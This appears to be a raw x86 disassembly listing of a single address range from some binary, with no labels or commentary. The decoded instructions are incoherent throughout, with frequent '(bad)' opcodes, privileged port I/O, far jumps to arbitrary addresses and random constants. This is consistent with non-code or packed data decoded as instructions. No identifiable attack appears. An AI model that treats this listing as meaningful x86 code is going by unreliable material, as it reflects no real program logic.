  406761:	xor    DWORD PTR [edx+0x6fa3a6df],eax
  406767:	push   ecx
  406768:	sub    al,0x82
  40676a:	sar    BYTE PTR [edi+eax*8-0x4ef6c677],1
  406771:	lods   al,BYTE PTR ds:[esi]
  406772:	push   ss
  406773:	fcomp  DWORD PTR [edi+0x6a]
  406776:	fild   DWORD PTR ds:0xe6709f7
  40677c:	sub    al,0xc9
  40677e:	and    eax,0x8b83764
  406783:	das    
  406784:	mov    DWORD PTR [esi-0x2f],ecx
  406787:	cmp    ch,BYTE PTR [edx-0x7f1b8d5e]
  40678d:	dec    BYTE PTR [ebp+eax*4+0x22e9fbd4]
  406794:	inc    ebx
  406795:	inc    edx
  406796:	mov    ds,esp
  406798:	ins    DWORD PTR es:[edi],dx
  406799:	(bad)  
  40679a:	pop    ss
  40679b:	or     al,0xf4
  40679d:	mov    ecx,0x5d549c40
  4067a2:	sbb    DWORD PTR [edx+0x1b0fb74a],ebp
  4067a8:	arpl   WORD PTR [edx],bx
  4067aa:	mov    eax,ds:0x37523a98
  4067af:	ins    DWORD PTR es:[edi],dx
  4067b0:	or     al,0xdd
  4067b2:	imul   esi,eax,0xeb931564
  4067b8:	loope  0x406750
  4067ba:	outs   dx,DWORD PTR ds:[esi]
  4067bb:	push   ds
  4067bc:	ret    
  4067bd:	mov    esi,0x6def94ba
  4067c2:	loop   0x4067fe
  4067c4:	xor    eax,0x3ea896e6
  4067c9:	add    al,0xe4
  4067cb:	dec    edx
  4067cc:	xor    esp,DWORD PTR [ebp+0x59ff3f32]
  4067d2:	aas    
  4067d3:	stc    
  4067d4:	adc    BYTE PTR [eax+edx*4],bh
  4067d7:	popa   
  4067d8:	inc    eax
  4067d9:	loop   0x40678c
  4067db:	daa    
  4067dc:	cmp    edi,DWORD PTR [edi]
  4067de:	xor    al,0x57
  4067e0:	aad    0x5e
  4067e2:	sub    eax,0xefe96ab2
  4067e7:	loope  0x406840
  4067e9:	fstp   TBYTE PTR [ebx]
  4067eb:	out    0xd4,al
  4067ed:	pop    esi
  4067ee:	add    ecx,DWORD PTR [esi-0x672d3c84]
  4067f4:	xchg   esp,eax
  4067f5:	pop    ss
  4067f6:	retf   
  4067f7:	mov    ecx,0xa01ce515
  4067fc:	add    esp,esi
  4067fe:	pop    ecx
  4067ff:	jbe    0x406867
  406801:	jo     0x4067df
  406803:	out    dx,eax
  406804:	mov    al,ds:0x2083ed64
  406809:	and    al,0x7d
  40680b:	push   ebp
  40680c:	fst    QWORD PTR [esi]
  40680e:	mov    cx,0xdcf9
  406812:	stos   DWORD PTR es:[edi],eax
  406813:	pop    esp
  406814:	frstor [ebp-0x1f]
  406817:	ror    dl,1
  406819:	clc    
  40681a:	int    0x1c
  40681c:	ret    
  40681d:	xchg   ebp,eax
  40681e:	xor    BYTE PTR [ebp-0x3a],dh
  406821:	cmc    
  406822:	(bad)  
  406823:	cmp    eax,0x10845b36
  406828:	cmp    BYTE PTR [edi],cl
  40682a:	(bad)  
  40682b:	std    
  40682c:	and    al,0xe3
  40682e:	retf   0x9e1a
  406831:	daa    
  406832:	std    
  406833:	push   0x6c
  406835:	jl     0x40680c
  406837:	enter  0x5c51,0xbb
  40683b:	sub    DWORD PTR [edx],esp
  40683d:	xchg   edx,eax
  40683e:	stos   BYTE PTR es:[edi],al
  40683f:	out    dx,al
  406840:	test   al,0xf
  406842:	sbb    DWORD PTR [ecx+0x16],esp
  406845:	inc    edx
  406846:	sbb    al,0x9e
  406848:	push   ds
  406849:	adc    DWORD PTR [esi-0x75ba0526],ebp
  40684f:	rol    dh,cl
  406851:	bound  esi,QWORD PTR [esi]
  406853:	stos   BYTE PTR es:[edi],al
  406854:	mov    BYTE PTR [edx+0xa48ce04],cl
  40685a:	xchg   ecx,eax
  40685b:	jl     0x406843
  40685d:	jae    0x40683c
  40685f:	and    DWORD PTR [ebp+eiz*2-0x7c],edx
  406863:	ds xor al,0xb3
  406866:	into   
  406867:	pop    edi
  406868:	adc    eax,0xbd226033
  40686d:	push   esp
  40686e:	lods   al,BYTE PTR ds:[esi]
  40686f:	xchg   ecx,eax
  406870:	cmp    bh,BYTE PTR [ecx]
  406872:	mov    esi,0xf24c778c
  406877:	loope  0x40682b
  406879:	test   DWORD PTR [ebp+edx*8+0x7d],eax
  40687d:	ja     0x406873
  40687f:	dec    edx
  406880:	popf   
  406881:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406882:	push   edi
  406883:	scas   al,BYTE PTR es:[edi]
  406884:	call   FWORD PTR [esi]
  406886:	or     eax,0x8313deaf
  40688b:	mov    DWORD PTR [edx],ebp
  40688d:	xchg   esi,eax
  40688e:	pop    eax
  40688f:	pop    ebp
  406890:	scas   al,BYTE PTR es:[edi]
  406891:	mov    WORD PTR [ebx-0x28fcd44d],es
  406897:	xor    eax,0x5a601607
  40689c:	ja     0x4068f6
  40689e:	pop    eax
  40689f:	mov    bh,0x8
  4068a1:	push   esp
  4068a2:	push   ebp
  4068a3:	int3   
  4068a4:	or     eax,0x277531d1
  4068a9:	ins    BYTE PTR es:[edi],dx
  4068aa:	pop    ss
  4068ab:	or     eax,0x74036ded
  4068b0:	hlt    
  4068b1:	add    dh,al
  4068b3:	in     al,dx
  4068b4:	or     BYTE PTR [edx+0x5e23ce3b],dl
  4068ba:	adc    DWORD PTR [ebx-0x7a],edx
  4068bd:	jmp    0x3f859c1e
  4068c2:	fdivr  st,st(5)
  4068c4:	push   es
  4068c5:	nop
  4068c6:	rol    BYTE PTR [ebp-0x2d],1
  4068c9:	or     DWORD PTR [eax+0x348c7b69],eax
  4068cf:	sahf   
  4068d0:	fcomp  QWORD PTR [eax+0x15]
  4068d3:	aad    0xd4
  4068d5:	icebp  
  4068d6:	aam    0xfe
  4068d8:	xrelease xchg DWORD PTR [ebx-0x5e],ebx
  4068dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068dd:	in     al,dx
  4068de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068df:	fsub   DWORD PTR [ecx-0x4]
  4068e2:	cmp    eax,0x34bba98c
  4068e7:	loop   0x4068f6
  4068e9:	xchg   DWORD PTR [ebx+0x4706c6de],ebx
  4068ef:	xor    ecx,DWORD PTR ds:0x4c612d90
  4068f5:	mov    ch,0x35
  4068f7:	xor    DWORD PTR [esi+0x1b52cb48],edx
  4068fd:	push   ss
  4068fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068ff:	adc    al,0x81
  406901:	iret   
  406902:	dec    esi
  406903:	mov    esp,0xe8867d74
  406908:	clc    
  406909:	mov    ah,0xf7
  40690b:	jmp    0xec2ca2df
  406910:	push   DWORD PTR [ebx]
  406912:	lahf   
  406913:	ins    BYTE PTR es:[edi],dx
  406914:	out    dx,eax
  406915:	daa    
  406916:	pop    eax
  406917:	test   BYTE PTR [edi+edi*8+0xe],0x8c
  40691c:	outs   dx,DWORD PTR ds:[esi]
  40691d:	sbb    dh,cl
  40691f:	mov    ds:0x55214da7,eax
  406924:	mov    al,0xb
  406926:	test   al,0xd3
  406928:	mov    edi,0xa3492154
  40692d:	mov    bl,BYTE PTR [ebp+edi*8-0x5b]
  406931:	cmp    BYTE PTR [ebx+0x4f],bl
  406934:	stos   BYTE PTR es:[edi],al
  406935:	or     eax,DWORD PTR [esi]
  406937:	xor    eax,DWORD PTR [edi-0x24]
  40693a:	mov    edx,0xc5c5f18c
  40693f:	stos   BYTE PTR es:[edi],al
  406940:	ja     0x40690a
  406942:	loopne 0x4069a2
  406944:	or     ah,cl
  406946:	dec    ecx
  406947:	xchg   BYTE PTR gs:[esi],bh
  40694a:	retf   0x9d1c
  40694d:	outs   dx,DWORD PTR ds:[esi]
  40694e:	jl     0x4069c8
  406950:	cmp    eax,edi
  406952:	mov    esp,0x2777e18
  406957:	and    DWORD PTR [eax],edx
  406959:	pop    es
  40695a:	or     bh,BYTE PTR [edx+ecx*8]
  40695d:	mov    BYTE PTR [esi],ah
  40695f:	out    dx,al
  406960:	dec    esi
  406961:	aaa    
  406962:	xor    dl,BYTE PTR [edx+ebx*2]
  406965:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406966:	stos   BYTE PTR es:[edi],al
  406967:	bound  ecx,QWORD PTR [eax+0x4e294f69]
  40696d:	push   ebx
  40696e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40696f:	jmp    0x65dd:0xfc5aeb41
  406976:	cli    
  406977:	icebp  
  406978:	(bad)  
  406979:	ins    BYTE PTR es:[edi],dx
  40697a:	and    BYTE PTR [edx+0x76],al
  40697d:	push   ds
  40697e:	loop   0x406984
  406980:	cmc    
  406981:	(bad)
  406985:	pop    ecx
  406986:	aaa    
  406987:	cmp    eax,DWORD PTR [ecx]
  406989:	push   0x16
  40698b:	jecxz  0x4069fb
  40698d:	jmp    DWORD PTR [ecx]
  40698f:	push   es
  406990:	outs   dx,BYTE PTR ds:[esi]
  406991:	ins    BYTE PTR es:[edi],dx
  406992:	jo     0x406a0d
  406994:	jg     0x406984
  406996:	shl    ah,cl
  406998:	in     al,dx
  406999:	dec    ecx
  40699a:	cld    
  40699b:	scas   al,BYTE PTR es:[edi]
  40699c:	rcr    BYTE PTR ss:[ebp+0x729c5b8],0xe2
  4069a4:	mov    eax,ds:0xc2ff8fe3
  4069a9:	hlt    
  4069aa:	xor    ch,BYTE PTR [ebp+0x71f2b56f]
  4069b0:	jbe    0x4069dd
  4069b2:	or     al,0xa5
  4069b4:	adc    al,0x2
  4069b6:	lods   eax,DWORD PTR ds:[esi]
  4069b7:	sti    
  4069b8:	pop    esi
  4069b9:	xchg   ecx,eax
  4069ba:	sub    esi,edi
  4069bc:	lea    ecx,[edi]
  4069be:	fldenv [eax-0x4f]
  4069c1:	push   eax
  4069c2:	and    BYTE PTR [esi],dl
  4069c4:	push   ebx
  4069c5:	xor    BYTE PTR [ebx+0x608d36e5],cl
  4069cb:	(bad)  
  4069cc:	icebp  
  4069cd:	aam    0x8f
  4069cf:	inc    esi
  4069d0:	push   esi
  4069d1:	jns    0x406956
  4069d3:	jle    0x4069c5
  4069d5:	pop    ecx
  4069d6:	pop    edi
  4069d7:	and    al,0xd7
  4069d9:	je     0x4069ee
  4069db:	sub    al,0xe5
  4069dd:	iret   
  4069de:	adc    BYTE PTR [edi-0x73],dl
  4069e1:	pop    eax
  4069e2:	jnp    0x4069aa
  4069e4:	(bad)  
  4069e6:	xchg   ecx,eax
  4069e7:	add    DWORD PTR [ebx-0x55],eax
  4069ea:	sub    ecx,DWORD PTR [eax-0x48eb5232]
  4069f0:	aaa    
  4069f1:	pushf  
  4069f2:	not    DWORD PTR [eax]
  4069f4:	cmp    DWORD PTR [eax-0x1eee1254],ebx
  4069fa:	dec    ebx
  4069fb:	push   ds
  4069fc:	bound  esi,QWORD PTR [esi]
  4069fe:	popf   
  4069ff:	push   ebx
  406a00:	mov    dh,0xc8
  406a02:	lea    esp,[ebp-0x7fbdd514]
  406a08:	fdiv   QWORD PTR [edx+ebp*1-0x4e6a0f9e]
  406a0f:	imul   esi,eax,0x23
  406a12:	popa   
  406a13:	gs push 0xb029b971
  406a19:	add    eax,0x480271c3
  406a1e:	dec    ecx
  406a1f:	ds (bad) 
  406a22:	dec    eax
  406a23:	je     0x406a1b
  406a25:	sahf   
  406a26:	xchg   esp,eax
  406a27:	push   0xfffffff5
  406a29:	mov    ds:0x160af7a6,eax
  406a2e:	ss in  al,dx
  406a30:	pop    ebx
  406a31:	pop    es
  406a32:	sub    al,0x70
  406a34:	imul   DWORD PTR [edx+0x45df8b19]
  406a3a:	scas   al,BYTE PTR es:[edi]
  406a3b:	leave  
  406a3c:	test   edi,ecx
  406a3e:	rcr    BYTE PTR [esi+0x1bc6a06d],1
  406a44:	cmp    cl,BYTE PTR [edx+edx*4-0x1f]
  406a48:	pop    esp
  406a49:	dec    eax
  406a4a:	pop    es
  406a4b:	call   0xf3426bfb
  406a50:	xor    BYTE PTR [eax-0x778f2eea],al
  406a56:	cmp    esp,ebx
  406a58:	call   DWORD PTR [ebx+eiz*8+0xa]
  406a5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a5d:	popa   
  406a5e:	das    
  406a5f:	std    
  406a60:	loopne 0x406a2d
  406a62:	and    DWORD PTR [ecx-0x2052c57f],ebp
  406a68:	mov    al,0x4
  406a6a:	sbb    DWORD PTR [ebx-0x428da8c3],0xd3063fe9
  406a74:	jp     0x406a1c
  406a76:	adc    DWORD PTR [eax+edi*2+0x52],esi
  406a7a:	sub    bl,BYTE PTR ss:[esi+0x47]
  406a7e:	dec    edi
  406a7f:	lods   eax,DWORD PTR ds:[esi]
  406a80:	bound  eax,QWORD PTR [esp+eax*2+0xd]
  406a84:	frstor [eax-0x71cace61]
  406a8a:	dec    edx
  406a8b:	scas   al,BYTE PTR es:[edi]
  406a8c:	add    al,0x60
  406a8e:	sub    DWORD PTR [ecx+0x40],0xffffff81
  406a92:	inc    ebx
  406a93:	mov    ebx,0x7fff01d9
  406a98:	inc    ecx
  406a99:	dec    ebx
  406a9a:	jno    0x406a4a
  406a9c:	dec    esi
  406a9d:	mov    bl,0xf2
  406a9f:	adc    eax,0xd58afaa
  406aa4:	clc    
  406aa5:	(bad)
  406aaa:	push   edi
  406aab:	clc    
  406aac:	imul   DWORD PTR [edi+0x189d1240]
  406ab2:	in     al,dx
  406ab3:	js     0x406add
  406ab5:	jge    0x406b07
  406ab7:	call   0x26fb:0xedabc3f7
  406abe:	sub    BYTE PTR gs:[ecx+0x76],0xe2
  406ac3:	sbb    dl,BYTE PTR [esi-0x38]
  406ac6:	mov    edx,0xdd900032
  406acb:	pop    es
  406acc:	add    ecx,ecx
  406ace:	inc    edx
  406acf:	outs   dx,DWORD PTR ds:[esi]
  406ad0:	aam    0xc8
  406ad2:	aam    0xd5
  406ad4:	jae    0x406b03
  406ad6:	pop    eax
  406ad7:	bound  esi,QWORD PTR [eax-0x1d83123c]
  406add:	loop   0x406ad9
  406adf:	sbb    al,0xeb
  406ae1:	cli    
  406ae2:	sub    al,BYTE PTR [ebx-0x3f6783c7]
  406ae8:	mov    al,ds:0xde508a28
  406aed:	dec    eax
  406aee:	scas   eax,DWORD PTR es:[edi]
  406aef:	push   0x8efe53d6
  406af4:	push   0x382b9ce3
  406af9:	inc    esi
  406afa:	jge    0x406ae5
  406afc:	mov    dh,0xb8
  406afe:	inc    ebx
  406aff:	pop    edi
  406b00:	in     eax,dx
  406b01:	xor    dl,ch
  406b03:	push   0x7721b008
  406b08:	out    dx,eax
  406b09:	sub    al,BYTE PTR [edi]
  406b0b:	or     eax,0xb4f811fd
  406b10:	xchg   ebp,eax
  406b11:	bound  edx,QWORD PTR [ebp+0x1]
  406b14:	sqrtps xmm7,XMMWORD PTR [eax-0x774765fc]
  406b1b:	call   0x68ca:0x1119503a
  406b22:	push   0x66
  406b24:	add    DWORD PTR [edi+esi*2],ebx
  406b27:	add    BYTE PTR [edx+0x623130d5],0xbe
  406b2e:	outs   dx,DWORD PTR ds:[esi]
  406b2f:	sub    al,0xc5
  406b31:	inc    ebp
  406b32:	(bad)
  406b36:	pop    esi
  406b37:	mov    esp,0xce328a
  406b3c:	and    cl,al
  406b3e:	in     al,dx
  406b3f:	addr16 pop es
  406b41:	push   0xffffffa3
  406b43:	clc    
  406b44:	xchg   ecx,eax
  406b45:	mov    esp,0x15d7dd89
  406b4a:	sub    ebp,DWORD PTR [edi-0x2d]
  406b4d:	jp     0x406bab
  406b4f:	cmp    ecx,DWORD PTR [ebx-0x6b29d283]
  406b55:	pop    ss
  406b56:	clc    
  406b57:	nop
  406b58:	imul   edx,DWORD PTR [eax-0x3c2881e],0x3d
  406b5f:	mov    eax,0x18c08764
  406b64:	(bad)  
  406b65:	mov    edx,0xf2ccf8af
  406b6a:	pop    ecx
  406b6b:	lods   eax,DWORD PTR ds:[esi]
  406b6c:	addr16 ds pushf 
  406b6f:	in     al,dx
  406b70:	pop    eax
  406b71:	sahf   
  406b72:	neg    DWORD PTR [esi-0x6c3ae7ca]
  406b78:	jl     0x406b8c
  406b7a:	div    DWORD PTR [ebx+0x24]
  406b7d:	cmp    BYTE PTR [edi],dl
  406b7f:	mov    cl,0x2a
  406b81:	xor    dh,ch
  406b83:	lock or edi,DWORD PTR cs:[esi+ecx*2]
  406b88:	out    dx,eax
  406b89:	cs or  eax,0x218e52d5
  406b8f:	sbb    BYTE PTR [eax-0x5],bl
  406b92:	cmp    BYTE PTR [edx+0xf0d5aef],dl
  406b98:	test   eax,0xaccffa83
  406b9d:	icebp  
  406b9e:	dec    ebx
  406b9f:	sub    eax,DWORD PTR ds:0xd009db0a
  406ba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ba6:	daa    
  406ba7:	mov    ds:0xb0c42c5f,al
  406bac:	and    al,0x10
  406bae:	test   DWORD PTR [eax],0x2a6701c1
  406bb4:	xor    BYTE PTR [ebx],bh
  406bb6:	int    0xd4
  406bb8:	test   eax,0x82b351a6
  406bbd:	xchg   esp,eax
  406bbe:	mov    DWORD PTR [edi],esp
  406bc0:	mov    BYTE PTR [eax-0x54],bl
  406bc3:	retf   0x3835
  406bc6:	and    al,0xb7
  406bc8:	mov    esp,0x19ab9a34
  406bcd:	ins    DWORD PTR es:[edi],dx
  406bce:	imul   ebp,DWORD PTR [ebx-0x7d],0x2d
  406bd2:	adc    DWORD PTR [ecx-0x32],0x6c
  406bd6:	pusha  
  406bd7:	ficom  DWORD PTR [eax]
  406bd9:	mov    ecx,0x70117e6c
  406bde:	xor    ch,BYTE PTR [eax]
  406be0:	mov    al,0xca
  406be2:	das    
  406be3:	mov    dh,bh
  406be5:	or     DWORD PTR [esi-0x75],esp
  406be8:	adc    esp,DWORD PTR [edi+0x7a4a399]
  406bee:	push   esp
  406bef:	mov    cs,WORD PTR [ebx+0x38]
  406bf2:	inc    ecx
  406bf3:	jbe    0x406bee
  406bf5:	dec    ebx
  406bf6:	adc    bh,BYTE PTR [edi-0x7]
  406bf9:	stos   DWORD PTR es:[edi],eax
  406bfa:	enter  0xc822,0xcb
  406bfe:	cmp    eax,0x44a1222e
  406c03:	pop    ss
  406c04:	mov    BYTE PTR [edi],al
  406c06:	cs jecxz 0x406c51
  406c09:	fbld   TBYTE PTR [ebp-0x9574783]
  406c0f:	fcmovbe st,st(7)
  406c11:	xor    DWORD PTR [ebx+0x7479bdbf],0xffffff9d
  406c18:	or     al,bh
  406c1a:	dec    edx
  406c1b:	mov    ecx,0xcfb5b3e
  406c20:	sub    al,0x1b
  406c22:	lahf   
  406c23:	sbb    al,0x66
  406c25:	xor    al,0xd5
  406c27:	sbb    al,0x8c
  406c29:	inc    eax
  406c2a:	loop   0x406c81
  406c2c:	xor    eax,0x7022a413
  406c31:	sub    eax,0x6c7ce7fd
  406c36:	std    
  406c37:	pop    ecx
  406c38:	pop    ds
  406c39:	sub    dl,dh
  406c3b:	sub    eax,0xbc19bd11
  406c41:	mov    ds:0xf6432cfb,eax
  406c46:	loop   0x406c35
  406c48:	sti    
  406c49:	shl    esp,cl
  406c4b:	daa    
  406c4c:	fild   DWORD PTR [ecx]
  406c4e:	test   eax,0xc4b0f277
  406c53:	out    dx,al
  406c54:	mov    edi,0x82b9a631
  406c59:	cs pop ds
  406c5b:	xchg   ebx,eax
  406c5c:	mov    eax,0x8c668eb2
  406c61:	(bad)  
  406c62:	cmp    ch,BYTE PTR [edx+0xb]
  406c65:	cmp    al,0x6
  406c67:	mov    edi,0x7189115c
  406c6c:	jmp    0x406cb8
  406c6e:	int3   
  406c6f:	cmp    ebx,DWORD PTR [esi+edx*4-0x23605a0a]
  406c76:	les    esi,FWORD PTR [eax-0x7b]
  406c79:	js     0x406c4a
  406c7b:	std    
  406c7c:	mov    cl,ah
  406c7e:	fnstenv [esi+0x70]
  406c81:	addr16 mov eax,ds:0x3477
  406c85:	inc    ebx
  406c86:	push   ds
  406c87:	jp     0x406c1a
  406c89:	inc    ebx
  406c8a:	sbb    edi,DWORD PTR [edi]
  406c8c:	xor    eax,0xbae395c5
  406c91:	sub    ax,0xc071
  406c95:	or     al,0xe4
  406c97:	fidivr DWORD PTR [eax+0xc448808]
  406c9d:	test   edi,edx
  406c9f:	cs js  0x406c78
  406ca2:	or     al,0xf7
  406ca4:	mov    edi,0xd30dad82
  406ca9:	sahf   
  406caa:	sbb    ecx,DWORD PTR [edx-0x3455eec5]
  406cb0:	jecxz  0x406c3f
  406cb2:	mov    esp,0x40bfc336
  406cb7:	sbb    al,ah
  406cb9:	outs   dx,DWORD PTR ds:[esi]
  406cba:	mov    ah,0xe3
  406cbc:	cmp    eax,0x2322f93d
  406cc1:	mov    dh,0x10
  406cc3:	jge    0x406c46
  406cc5:	ins    DWORD PTR es:[edi],dx
  406cc6:	inc    ebx
  406cc7:	repz and eax,0x989872dc
  406ccd:	mov    ch,0x5d
  406ccf:	cld    
  406cd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cd1:	jmp    0xb3a178df
  406cd6:	cs mov edi,0xb8428934
  406cdc:	mov    esi,DWORD PTR [ebx+0x5c]
  406cdf:	jbe    0x406d42
  406ce1:	xor    dh,ch
  406ce3:	stc    
  406ce4:	jo     0x406ca7
  406ce6:	add    al,0x66
  406ce8:	jnp    0x406cad
  406cea:	mov    eax,0x5ce38788
  406cef:	and    bl,BYTE PTR [edi-0x190ed813]
  406cf5:	dec    esp
  406cf6:	aam    0x24
  406cf8:	cmp    al,0xd9
  406cfa:	fnsave [edi-0x924433e]
  406d00:	cld    
  406d01:	(bad)  
  406d02:	mov    cl,BYTE PTR cs:[edx]
  406d05:	popf   
  406d06:	rcr    BYTE PTR [eax+esi*4-0x34],1
  406d0a:	mov    dh,bl
  406d0c:	and    ecx,esp
  406d0e:	cmp    al,0x6c
  406d10:	inc    esp
  406d11:	inc    esp
  406d12:	ins    BYTE PTR es:[edi],dx
  406d13:	(bad)  
  406d15:	test   eax,0xdd2b8627
  406d1a:	or     ebx,eax
  406d1c:	shl    BYTE PTR [ecx-0x5c],0x7f
  406d20:	mov    ebx,0x534286bf
  406d25:	pop    esi
  406d26:	lods   eax,DWORD PTR ds:[esi]
  406d27:	xchg   eax,edi
  406d29:	xchg   ecx,eax
  406d2a:	xchg   ecx,esi
  406d2c:	xlat   BYTE PTR ds:[ebx]
  406d2d:	(bad)  
  406d2e:	retf   
  406d2f:	adc    DWORD PTR [edi+ecx*2+0x53],ebp
  406d33:	imul   eax,DWORD PTR [ecx],0x803f1fc6
  406d39:	xchg   edi,eax
  406d3a:	pop    es
  406d3b:	or     ebp,DWORD PTR [eax-0x65]
  406d3e:	inc    ebp
  406d3f:	push   0x68319795
  406d44:	es push 0xffffff99
  406d47:	inc    BYTE PTR [ebp+esi*1+0x5f]
  406d4b:	add    ah,dh
  406d4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d4f:	iret   
  406d50:	(bad)  
  406d51:	mov    bh,0x6
  406d53:	jg     0x406d90
  406d55:	aam    0xf7
  406d57:	jmp    0x3a9ef10b
  406d5c:	sub    eax,0x41f64c3
  406d61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d62:	xor    al,0x69
  406d64:	std    
  406d65:	mov    ch,BYTE PTR [ebp+0x4f]
  406d68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d69:	mov    edx,0x82c340b6
  406d6e:	or     eax,0xcd4c6537
  406d73:	add    eax,0xc82c2f71
  406d78:	fsub   DWORD PTR [edi+0x5d]
  406d7b:	pop    ecx
  406d7c:	cmp    edi,DWORD PTR [ebx+0xeeabc11]
  406d82:	push   ecx
  406d83:	adc    BYTE PTR ds:0x392b9f0d,cl
  406d89:	hlt    
  406d8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d8b:	adc    eax,0x86794384
  406d90:	push   ebp
  406d91:	mov    cl,0x2c
  406d93:	sti    
  406d94:	fidiv  WORD PTR [ebx-0x64]
  406d97:	and    bh,BYTE PTR ds:0xa11f31d9
  406d9d:	in     eax,0xf3
  406d9f:	outs   dx,BYTE PTR ds:[esi]
  406da0:	mov    ds:0x2a9f00d0,eax
  406da5:	sub    BYTE PTR [edx-0x25],ah
  406da8:	dec    ebx
  406da9:	sbb    cl,BYTE PTR [ecx-0x1177d6e]
  406daf:	ret    
  406db0:	or     al,0xff
  406db2:	sbb    bl,BYTE PTR [edi+0x29ba637]
  406db8:	scas   al,BYTE PTR es:[edi]
  406db9:	add    BYTE PTR [ecx],cl
  406dbb:	jle    0x406d81
  406dbd:	push   es
  406dbe:	push   esp
  406dbf:	ds mov dh,0x81
  406dc2:	ret    
  406dc3:	cmp    BYTE PTR [ebp-0x3e0ae71a],dh
  406dc9:	pop    ss
  406dca:	inc    edx
  406dcb:	mov    dh,0x74
  406dcd:	xor    BYTE PTR [ebp-0x3c],dl
  406dd0:	mov    bh,0x92
  406dd2:	jo     0x406dbb
  406dd4:	imul   eax,DWORD PTR [eax],0xae935288
  406dda:	cmp    DWORD PTR [ecx+0x1e],eax
  406ddd:	dec    ebx
  406dde:	clc    
  406ddf:	xchg   esi,eax
  406de0:	outs   dx,BYTE PTR ds:[esi]
  406de1:	je     0x406e45
  406de3:	mov    edx,0xc093b50d
  406de8:	ins    DWORD PTR es:[edi],dx
  406de9:	inc    esi
  406dea:	pop    esi
  406deb:	and    al,0xe
  406ded:	jb     0x406dfa
  406def:	out    0x17,eax
  406df1:	addr16 mov ch,0x62
  406df4:	std    
  406df5:	xor    ah,ch
  406df7:	pusha  
  406df8:	jle    0x406de3
  406dfa:	pop    ebx
  406dfb:	sbb    BYTE PTR [eax],ah
  406dfd:	mov    al,ds:0x10b0d371
  406e02:	cwde   
  406e03:	xor    ch,BYTE PTR [esi-0x64]
  406e06:	ja     0x406d8e
  406e08:	mov    bh,0x44
  406e0a:	int    0x39
  406e0c:	pop    esi
  406e0d:	cmp    al,0x77
  406e0f:	push   cs
  406e10:	arpl   dx,di
  406e12:	nop
  406e13:	cwde   
  406e14:	rcr    BYTE PTR [edx],1
  406e16:	cdq    
  406e17:	ret    0xf9be
  406e1a:	push   ebx
  406e1b:	sbb    DWORD PTR [edx-0x6d39cc5b],esp
  406e21:	fimul  WORD PTR [edi-0x70]
  406e24:	test   al,0xb4
  406e26:	jae    0x406e56
  406e28:	adc    eax,0x20ad4b2a
  406e2d:	mov    esi,0x1623b8a3
  406e32:	aaa    
  406e33:	arpl   di,di
  406e35:	jno    0x406de5
  406e37:	sub    cl,bh
  406e39:	(bad)  
  406e3b:	into   
  406e3c:	xchg   ebx,eax
  406e3d:	lahf   
  406e3e:	loope  0x406e56
  406e40:	ds or  eax,0xa0e31658
  406e46:	cld    
  406e47:	fcom   QWORD PTR [ecx]
  406e49:	cs das 
  406e4b:	xchg   esp,eax
  406e4c:	add    BYTE PTR [eax],bh
  406e4e:	mov    cl,BYTE PTR [ecx-0x19]
  406e51:	sbb    BYTE PTR [esi-0x39f4412f],al
  406e57:	aam    0xed
  406e59:	mov    DWORD PTR [ebx+0x37],ebp
  406e5c:	ficom  WORD PTR ds:[edi]
  406e5f:	mov    BYTE PTR [edi],ch
  406e61:	and    eax,DWORD PTR [eax+0x4cbeeacf]
  406e67:	mov    ds:0x9b655428,eax
  406e6c:	add    DWORD PTR [ecx],0x7ca0abc2
  406e72:	inc    edx
  406e73:	mov    ds:0x4486d38a,eax
  406e78:	jo     0x406ebb
  406e7a:	mov    al,ch
  406e7c:	sub    edi,ebp
  406e7e:	sub    BYTE PTR [ecx+0x1a4080ad],al
  406e84:	aad    0x51
  406e86:	pop    ebx
  406e87:	mov    esp,0xf06d9451
  406e8c:	pushf  
  406e8d:	dec    edx
  406e8e:	adc    BYTE PTR [ebp-0x31],bl
  406e91:	jae    0x406e95
  406e93:	inc    ebp
  406e94:	sti    
  406e95:	in     eax,dx
  406e96:	cdq    
  406e97:	stos   DWORD PTR es:[edi],eax
  406e98:	pop    edx
  406e99:	out    dx,eax
  406e9a:	sti    
  406e9b:	into   
  406e9c:	loope  0x406eac
  406e9e:	cmp    eax,0xed7128f9
  406ea3:	xor    al,0xf5
  406ea5:	not    DWORD PTR [ebp-0x60]
  406ea8:	outs   dx,BYTE PTR ds:[esi]
  406ea9:	ss and esp,0xe3d039ad
  406eb0:	dec    ebx
  406eb1:	jb     0x406e33
  406eb3:	(bad)  
  406eb4:	loopne 0x406f06
  406eb6:	stos   BYTE PTR es:[edi],al
  406eb7:	sbb    dl,0xaa
  406eba:	jge    0x406e53
  406ebc:	sub    ecx,DWORD PTR [esi+ebp*2+0x7e]
  406ec0:	adc    DWORD PTR [edi],edx
  406ec2:	sub    al,0xa7
  406ec4:	iret   
  406ec5:	pusha  
  406ec6:	stos   DWORD PTR es:[edi],eax
  406ec7:	cs (bad) 
  406ec9:	test   eax,0xa418d1e4
  406ece:	dec    edi
  406ecf:	jge    0x406f09
  406ed1:	sti    
  406ed2:	or     al,0x67
  406ed4:	add    edi,edx
  406ed6:	jae    0x406e79
  406ed8:	cld    
  406ed9:	xchg   al,dh
  406edb:	mov    cl,0x7c
  406edd:	(bad)  
  406ede:	jae    0x406f2f
  406ee0:	out    dx,al
  406ee1:	jnp    0x406efe
  406ee3:	mov    DWORD PTR [ecx+0x21],ebp
  406ee6:	dec    ebx
  406ee7:	in     al,0xd
  406ee9:	pop    es
  406eea:	out    0x92,eax
  406eec:	add    DWORD PTR [esp-0x10],ebp
  406ef0:	ins    DWORD PTR es:[edi],dx
  406ef1:	xchg   DWORD PTR fs:[ecx-0x7b],edi
  406ef5:	xor    BYTE PTR [esi+edx*2-0x5fe41835],bh
  406efc:	jbe    0x406ef2
